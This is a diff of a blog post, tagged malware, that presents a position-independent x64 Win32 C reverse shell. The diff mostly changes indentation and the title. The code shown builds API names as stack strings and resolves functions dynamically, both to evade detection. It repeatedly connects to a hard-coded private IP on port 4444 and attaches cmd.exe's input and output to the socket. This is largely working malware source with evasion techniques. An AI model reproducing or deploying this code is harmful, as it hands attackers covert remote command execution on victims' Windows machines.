@@ -1,5 +1,5 @@
 ---
-title: Position Independent Code x64 Win32 C implementation of reverse shell
+title: C implementation of reverse shell (x64 Win32 API)
 categories: [programming, win32 , malware]
 tags: [lowlevel]
 ---
@@ -162,55 +162,55 @@ typedef int (WINAPI* WSAConnectFunc)(SOCKET s, const struct sockaddr* name, int 
 
 int ReverseShell(char* server_ip, unsigned short server_port)
 {
-	WSADATA wsaData;
-	SOCKET sock = NULL;
-	struct sockaddr_in server;
+    WSADATA wsaData;
+    SOCKET sock = NULL;
+    struct sockaddr_in server;
 
-	// stack based string 
-	CHAR cmdline[] = { 'c','m','d','.','e','x','e',0 };
-	//CHAR connectStr[] = { 'c','o','n','n','e','c','t',0 };
-	CHAR closesocketStr[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
-	CHAR WSACleanupStr[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
-	CHAR WSAStartupStr[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
-	CHAR WSASocketAStr[] = { 'W','S','A','S','o','c','k','e','t','A',0 };
-	CHAR WSAConnectStr[] = { 'W','S','A','C','o','n','n','e','c','t',0 };
-	CHAR socketStr[] = { 's','o','c','k','e','t',0 };
-	CHAR inet_addrStr[] = { 'i','n','e','t','_','a','d','d','r',0 };
-	CHAR htonsStr[] = { 'h','t','o','n','s',0 };
-	CHAR recvStr[] = { 'r','e','c','v',0 };
-	CHAR CloseHandleStr[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
-	CHAR WaitForSingleObjectStr[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
-	CHAR CreateProcessAStr[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
-	CHAR ExitProcessStr[] = { 'E','x','i','t','P','r','o','c','e','s','s',0 };
+    // stack based string 
+    CHAR cmdline[] = { 'c','m','d','.','e','x','e',0 };
+    //CHAR connectStr[] = { 'c','o','n','n','e','c','t',0 };
+    CHAR closesocketStr[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
+    CHAR WSACleanupStr[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
+    CHAR WSAStartupStr[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
+    CHAR WSASocketAStr[] = { 'W','S','A','S','o','c','k','e','t','A',0 };
+    CHAR WSAConnectStr[] = { 'W','S','A','C','o','n','n','e','c','t',0 };
+    CHAR socketStr[] = { 's','o','c','k','e','t',0 };
+    CHAR inet_addrStr[] = { 'i','n','e','t','_','a','d','d','r',0 };
+    CHAR htonsStr[] = { 'h','t','o','n','s',0 };
+    CHAR recvStr[] = { 'r','e','c','v',0 };
+    CHAR CloseHandleStr[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
+    CHAR WaitForSingleObjectStr[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
+    CHAR CreateProcessAStr[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
+    CHAR ExitProcessStr[] = { 'E','x','i','t','P','r','o','c','e','s','s',0 };
 
-	// dynamic load lib
-	WCHAR baseStr[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l',0 };
-	LPVOID base = get_module_by_name(baseStr);
-	CHAR load_libStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
-	LPVOID load_lib = get_func_by_name((HMODULE)base, load_libStr);
-	CHAR get_procStr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
-	LPVOID get_proc = get_func_by_name((HMODULE)base, get_procStr);
-	HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
-	FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;
+    // dynamic load lib
+    WCHAR baseStr[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l',0 };
+    LPVOID base = get_module_by_name(baseStr);
+    CHAR load_libStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
+    LPVOID load_lib = get_func_by_name((HMODULE)base, load_libStr);
+    CHAR get_procStr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
+    LPVOID get_proc = get_func_by_name((HMODULE)base, get_procStr);
+    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
+    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;
 
-	CHAR w2_32libStr[] = { 'W','S','2','_','3','2','.','d','l','l',0 };
-	HMODULE hModule = (HMODULE)_LoadLibraryA(w2_32libStr);
+    CHAR w2_32libStr[] = { 'W','S','2','_','3','2','.','d','l','l',0 };
+    HMODULE hModule = (HMODULE)_LoadLibraryA(w2_32libStr);
 
-	ClosesocketFunc closesocketFunc = (ClosesocketFunc)_GetProcAddress(hModule, closesocketStr);
-	WSACleanupFunc wsacleanupFunc = (WSACleanupFunc)_GetProcAddress(hModule, WSACleanupStr);
-	WSAStartupFunc wsastartupFunc = (WSAStartupFunc)_GetProcAddress(hModule, WSAStartupStr);
-	SocketFunc socketFunc = (SocketFunc)_GetProcAddress(hModule, socketStr);
-	InetAddrFunc inet_addrFunc = (InetAddrFunc)_GetProcAddress(hModule, inet_addrStr);
-	HtonsFunc htonsFunc = (HtonsFunc)_GetProcAddress(hModule, htonsStr);
-	RecvFunc recvFunc = (RecvFunc)_GetProcAddress(hModule, recvStr);
-	WSASocketAFunc wsasocketaFunc = (WSASocketAFunc)_GetProcAddress(hModule, WSASocketAStr);
-	WSAConnectFunc wsaconnectaFunc = (WSAConnectFunc)_GetProcAddress(hModule, WSAConnectStr);
+    ClosesocketFunc closesocketFunc = (ClosesocketFunc)_GetProcAddress(hModule, closesocketStr);
+    WSACleanupFunc wsacleanupFunc = (WSACleanupFunc)_GetProcAddress(hModule, WSACleanupStr);
+    WSAStartupFunc wsastartupFunc = (WSAStartupFunc)_GetProcAddress(hModule, WSAStartupStr);
+    SocketFunc socketFunc = (SocketFunc)_GetProcAddress(hModule, socketStr);
+    InetAddrFunc inet_addrFunc = (InetAddrFunc)_GetProcAddress(hModule, inet_addrStr);
+    HtonsFunc htonsFunc = (HtonsFunc)_GetProcAddress(hModule, htonsStr);
+    RecvFunc recvFunc = (RecvFunc)_GetProcAddress(hModule, recvStr);
+    WSASocketAFunc wsasocketaFunc = (WSASocketAFunc)_GetProcAddress(hModule, WSASocketAStr);
+    WSAConnectFunc wsaconnectaFunc = (WSAConnectFunc)_GetProcAddress(hModule, WSAConnectStr);
 
 
-	CloseHandleFunc closeHandleFunc = (CloseHandleFunc)_GetProcAddress((HMODULE)base, CloseHandleStr);
-	WaitForSingleObjectFunc waitForSingleObjectFunc = (WaitForSingleObjectFunc)_GetProcAddress((HMODULE)base, WaitForSingleObjectStr);
-	CreateProcessAFunc createProcessAFunc = (CreateProcessAFunc)_GetProcAddress((HMODULE)base, CreateProcessAStr);
-	ExitProcessFunc exitProcessFunc = (ExitProcessFunc)_GetProcAddress((HMODULE)base, ExitProcessStr);
+    CloseHandleFunc closeHandleFunc = (CloseHandleFunc)_GetProcAddress((HMODULE)base, CloseHandleStr);
+    WaitForSingleObjectFunc waitForSingleObjectFunc = (WaitForSingleObjectFunc)_GetProcAddress((HMODULE)base, WaitForSingleObjectStr);
+    CreateProcessAFunc createProcessAFunc = (CreateProcessAFunc)_GetProcAddress((HMODULE)base, CreateProcessAStr);
+    ExitProcessFunc exitProcessFunc = (ExitProcessFunc)_GetProcAddress((HMODULE)base, ExitProcessStr);
 
     // ...
 }
@@ -258,23 +258,23 @@ Final result code:
 
 void* _memset(void* dest, int val, size_t count)
 {
-	BYTE* destByte = (BYTE*)dest;
-	while (count--) {
-		*destByte++ = (BYTE)val;
-	}
-	return dest;
+    BYTE* destByte = (BYTE*)dest;
+    while (count--) {
+        *destByte++ = (BYTE)val;
+    }
+    return dest;
 }
 
 int _lstrcmpA(const char* lpString1, const char* lpString2)
 {
-	int result = 0;
-	while (*lpString1 && *lpString2) {
-		result = (*lpString1++) - (*lpString2++);
-		if (result) {
-			return result;
-		}
-	}
-	return (*lpString1) - (*lpString2);
+    int result = 0;
+    while (*lpString1 && *lpString2) {
+        result = (*lpString1++) - (*lpString2++);
+        if (result) {
+            return result;
+        }
+    }
+    return (*lpString1) - (*lpString2);
 }
 
 
@@ -296,111 +296,111 @@ typedef int (WINAPI* WSAConnectFunc)(SOCKET s, const struct sockaddr* name, int 
 
 
 int ReverseShell(char* server_ip, unsigned short server_port) {
-	WSADATA wsaData;
-	SOCKET sock = NULL;
-	struct sockaddr_in server;
+    WSADATA wsaData;
+    SOCKET sock = NULL;
+    struct sockaddr_in server;
 
-	// stack based string 
-	CHAR cmdline[] = { 'c','m','d','.','e','x','e',0 };
-	CHAR closesocketStr[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
-	CHAR WSACleanupStr[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
-	CHAR WSAStartupStr[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
-	CHAR WSASocketAStr[] = { 'W','S','A','S','o','c','k','e','t','A',0 };
-	CHAR WSAConnectStr[] = { 'W','S','A','C','o','n','n','e','c','t',0 };
-	CHAR socketStr[] = { 's','o','c','k','e','t',0 };
-	CHAR inet_addrStr[] = { 'i','n','e','t','_','a','d','d','r',0 };
-	CHAR htonsStr[] = { 'h','t','o','n','s',0 };
-	CHAR recvStr[] = { 'r','e','c','v',0 };
-	CHAR CloseHandleStr[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
-	CHAR WaitForSingleObjectStr[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
-	CHAR CreateProcessAStr[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
-	CHAR ExitProcessStr[] = { 'E','x','i','t','P','r','o','c','e','s','s',0 };
+    // stack based string 
+    CHAR cmdline[] = { 'c','m','d','.','e','x','e',0 };
+    CHAR closesocketStr[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
+    CHAR WSACleanupStr[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
+    CHAR WSAStartupStr[] = { 'W','S','A','S','t','a','r','t','u','p',0 };
+    CHAR WSASocketAStr[] = { 'W','S','A','S','o','c','k','e','t','A',0 };
+    CHAR WSAConnectStr[] = { 'W','S','A','C','o','n','n','e','c','t',0 };
+    CHAR socketStr[] = { 's','o','c','k','e','t',0 };
+    CHAR inet_addrStr[] = { 'i','n','e','t','_','a','d','d','r',0 };
+    CHAR htonsStr[] = { 'h','t','o','n','s',0 };
+    CHAR recvStr[] = { 'r','e','c','v',0 };
+    CHAR CloseHandleStr[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
+    CHAR WaitForSingleObjectStr[] = { 'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };
+    CHAR CreateProcessAStr[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
+    CHAR ExitProcessStr[] = { 'E','x','i','t','P','r','o','c','e','s','s',0 };
 
-	// dynamic load lib
-	WCHAR baseStr[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l',0 };
-	LPVOID base = get_module_by_name(baseStr);
-	CHAR load_libStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
-	LPVOID load_lib = get_func_by_name((HMODULE)base, load_libStr);
-	CHAR get_procStr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
-	LPVOID get_proc = get_func_by_name((HMODULE)base, get_procStr);
-	HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
-	FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;
+    // dynamic load lib
+    WCHAR baseStr[] = { L'k',L'e',L'r',L'n',L'e',L'l',L'3',L'2',L'.',L'd',L'l',L'l',0 };
+    LPVOID base = get_module_by_name(baseStr);
+    CHAR load_libStr[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
+    LPVOID load_lib = get_func_by_name((HMODULE)base, load_libStr);
+    CHAR get_procStr[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
+    LPVOID get_proc = get_func_by_name((HMODULE)base, get_procStr);
+    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;
+    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;
 
-	CHAR w2_32libStr[] = { 'W','S','2','_','3','2','.','d','l','l',0 };
-	HMODULE hModule = (HMODULE)_LoadLibraryA(w2_32libStr);
+    CHAR w2_32libStr[] = { 'W','S','2','_','3','2','.','d','l','l',0 };
+    HMODULE hModule = (HMODULE)_LoadLibraryA(w2_32libStr);
 
-	ClosesocketFunc closesocketFunc = (ClosesocketFunc)_GetProcAddress(hModule, closesocketStr);
-	WSACleanupFunc wsacleanupFunc = (WSACleanupFunc)_GetProcAddress(hModule, WSACleanupStr);
-	WSAStartupFunc wsastartupFunc = (WSAStartupFunc)_GetProcAddress(hModule, WSAStartupStr);
-	SocketFunc socketFunc = (SocketFunc)_GetProcAddress(hModule, socketStr);
-	InetAddrFunc inet_addrFunc = (InetAddrFunc)_GetProcAddress(hModule, inet_addrStr);
-	HtonsFunc htonsFunc = (HtonsFunc)_GetProcAddress(hModule, htonsStr);
-	RecvFunc recvFunc = (RecvFunc)_GetProcAddress(hModule, recvStr);
-	WSASocketAFunc wsasocketaFunc = (WSASocketAFunc)_GetProcAddress(hModule, WSASocketAStr);
-	WSAConnectFunc wsaconnectaFunc = (WSAConnectFunc)_GetProcAddress(hModule, WSAConnectStr);
+    ClosesocketFunc closesocketFunc = (ClosesocketFunc)_GetProcAddress(hModule, closesocketStr);
+    WSACleanupFunc wsacleanupFunc = (WSACleanupFunc)_GetProcAddress(hModule, WSACleanupStr);
+    WSAStartupFunc wsastartupFunc = (WSAStartupFunc)_GetProcAddress(hModule, WSAStartupStr);
+    SocketFunc socketFunc = (SocketFunc)_GetProcAddress(hModule, socketStr);
+    InetAddrFunc inet_addrFunc = (InetAddrFunc)_GetProcAddress(hModule, inet_addrStr);
+    HtonsFunc htonsFunc = (HtonsFunc)_GetProcAddress(hModule, htonsStr);
+    RecvFunc recvFunc = (RecvFunc)_GetProcAddress(hModule, recvStr);
+    WSASocketAFunc wsasocketaFunc = (WSASocketAFunc)_GetProcAddress(hModule, WSASocketAStr);
+    WSAConnectFunc wsaconnectaFunc = (WSAConnectFunc)_GetProcAddress(hModule, WSAConnectStr);
 
 
-	CloseHandleFunc closeHandleFunc = (CloseHandleFunc)_GetProcAddress((HMODULE)base, CloseHandleStr);
-	WaitForSingleObjectFunc waitForSingleObjectFunc = (WaitForSingleObjectFunc)_GetProcAddress((HMODULE)base, WaitForSingleObjectStr);
-	CreateProcessAFunc createProcessAFunc = (CreateProcessAFunc)_GetProcAddress((HMODULE)base, CreateProcessAStr);
-	ExitProcessFunc exitProcessFunc = (ExitProcessFunc)_GetProcAddress((HMODULE)base, ExitProcessStr);
+    CloseHandleFunc closeHandleFunc = (CloseHandleFunc)_GetProcAddress((HMODULE)base, CloseHandleStr);
+    WaitForSingleObjectFunc waitForSingleObjectFunc = (WaitForSingleObjectFunc)_GetProcAddress((HMODULE)base, WaitForSingleObjectStr);
+    CreateProcessAFunc createProcessAFunc = (CreateProcessAFunc)_GetProcAddress((HMODULE)base, CreateProcessAStr);
+    ExitProcessFunc exitProcessFunc = (ExitProcessFunc)_GetProcAddress((HMODULE)base, ExitProcessStr);
 
-	int cpt = 0;
-	while (42)
-	{
+    int cpt = 0;
+    while (42)
+    {
 
-		wsastartupFunc(MAKEWORD(2, 2), &wsaData);
-		sock = wsasocketaFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
-		server.sin_family = AF_INET;
-		server.sin_addr.s_addr = (ULONG)inet_addrFunc(server_ip);
-		server.sin_port = (USHORT)htonsFunc(4444);
+        wsastartupFunc(MAKEWORD(2, 2), &wsaData);
+        sock = wsasocketaFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+        server.sin_family = AF_INET;
+        server.sin_addr.s_addr = (ULONG)inet_addrFunc(server_ip);
+        server.sin_port = (USHORT)htonsFunc(4444);
 
-		// Connect with host
-		if (wsaconnectaFunc(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
-			closesocketFunc(sock);
-			wsacleanupFunc();
-			continue;
-		}
-		else
-		{
-			char recvData[BUFFER_LEN];
-			_memset(recvData, 0, sizeof(recvData));
-			int recvCode = recvFunc(sock, recvData, BUFFER_LEN, 0);
+        // Connect with host
+        if (wsaconnectaFunc(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+            closesocketFunc(sock);
+            wsacleanupFunc();
+            continue;
+        }
+        else
+        {
+            char recvData[BUFFER_LEN];
+            _memset(recvData, 0, sizeof(recvData));
+            int recvCode = recvFunc(sock, recvData, BUFFER_LEN, 0);
 
-			if (recvCode <= 0)
-			{
-				closesocketFunc(sock);
-				wsacleanupFunc();
-				continue;
-			}
-			else
-			{
-				STARTUPINFO si;
-				PROCESS_INFORMATION pi;
-				_memset(&si, 0, sizeof(si));
-				si.cb = sizeof(si);
-				si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
-				si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
-				createProcessAFunc(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
-				waitForSingleObjectFunc(pi.hProcess, INFINITE);
-				closeHandleFunc(pi.hProcess);
-				closeHandleFunc(pi.hThread);
+            if (recvCode <= 0)
+            {
+                closesocketFunc(sock);
+                wsacleanupFunc();
+                continue;
+            }
+            else
+            {
+                STARTUPINFO si;
+                PROCESS_INFORMATION pi;
+                _memset(&si, 0, sizeof(si));
+                si.cb = sizeof(si);
+                si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+                si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+                createProcessAFunc(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
+                waitForSingleObjectFunc(pi.hProcess, INFINITE);
+                closeHandleFunc(pi.hProcess);
+                closeHandleFunc(pi.hThread);
 
-				_memset(recvData, 0, sizeof(recvData));
-				int recvCode = recvFunc(sock, recvData, BUFFER_LEN, 0);
-				if (recvCode <= 0) {
-					closesocketFunc(sock);
-					wsacleanupFunc();
-					continue;
-				}
-				char exitStr[] = { 'e', 'x', 'i', 't', '\n', 0 };
-				if (_lstrcmpA(recvData, exitStr) == 0) {
-					exitProcessFunc(0);
-				}
+                _memset(recvData, 0, sizeof(recvData));
+                int recvCode = recvFunc(sock, recvData, BUFFER_LEN, 0);
+                if (recvCode <= 0) {
+                    closesocketFunc(sock);
+                    wsacleanupFunc();
+                    continue;
+                }
+                char exitStr[] = { 'e', 'x', 'i', 't', '\n', 0 };
+                if (_lstrcmpA(recvData, exitStr) == 0) {
+                    exitProcessFunc(0);
+                }
 
-			}
-		}
-	}
+            }
+        }
+    }
 
 
 
@@ -410,9 +410,9 @@ int ReverseShell(char* server_ip, unsigned short server_port) {
 
 //int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 int main() {
-	CHAR ipstr[] = {'1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '7', '7',  0 };
-	ReverseShell(ipstr, 4444u);
-	return 0;
+    CHAR ipstr[] = {'1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '7', '7',  0 };
+    ReverseShell(ipstr, 4444u);
+    return 0;
 }
 
 ```
